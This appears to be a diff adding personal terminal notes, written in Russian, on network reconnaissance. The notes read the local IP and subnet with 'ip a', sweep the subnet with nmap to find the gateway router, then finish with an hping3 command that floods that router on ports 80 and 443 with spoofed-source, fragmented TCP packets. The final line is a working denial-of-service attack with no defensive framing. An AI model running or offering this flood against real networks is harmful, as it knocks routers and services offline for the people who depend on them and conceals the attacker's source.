@@ -1,0 +1,38 @@
+Получение локального адреса и маски подсети:
+Terminal
+ip a
+philip$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: wlp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 70:66:55:ce:49:c5 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.68.107/24 brd 192.168.68.255 scope global dynamic noprefixroute wlp2s0
+       valid_lft 4200sec preferred_lft 4200sec
+    inet6 fe80::c00a:d6b4:170b:da8b/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+
+IP: 192.168.68.107
+
+Маска подсети: /24 (то есть 255.255.255.0)
+
+Сканируем подсеть:
+nmap -sn 192.168.68.0/24
+
+philip$ nmap -sn 192.168.68.0/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 17:48 EEST
+Nmap scan report for _gateway (192.168.68.1)
+Host is up (0.0023s latency).
+Nmap scan report for philip-VivoBook-ASUSLaptop-X509DJ-M509DJ (192.168.68.107)
+Host is up (0.00012s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 2.34 seconds
+
+_gateway (192.168.68.1) - роутер
+philip-VivoBook-ASUSLaptop-X509DJ-M509DJ (192.168.68.107) — ноутбук.
+
+sudo hping3 -S -A -F --flood --rand-source --frag --tcp-mss 1460 -ttl 5 --checksum 0 --tcp-window 10000 -n --no-exit -p 80,443 --data 1200 192.168.68.1
+
+
